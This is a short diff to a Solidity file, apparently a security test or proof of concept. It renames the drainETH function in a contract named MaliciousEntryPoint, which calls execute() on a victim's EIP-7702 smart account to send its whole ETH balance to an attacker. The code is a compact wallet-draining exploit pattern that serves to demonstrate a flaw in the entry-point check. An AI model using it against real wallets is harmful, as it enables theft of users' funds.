@@ -16,7 +16,7 @@ import {EntryPoint} from "account-abstraction/core/EntryPoint.sol";
 ///      the attacker can call execute() on the victim's wallet because
 ///      onlyEntryPointOrSelf checks msg.sender == entryPoint().
 contract MaliciousEntryPoint {
-    function drainETH(SmartAccount7702 victim, address attacker) external {
+    function drainEth(SmartAccount7702 victim, address attacker) external {
         victim.execute(attacker, address(victim).balance, "");
     }
 
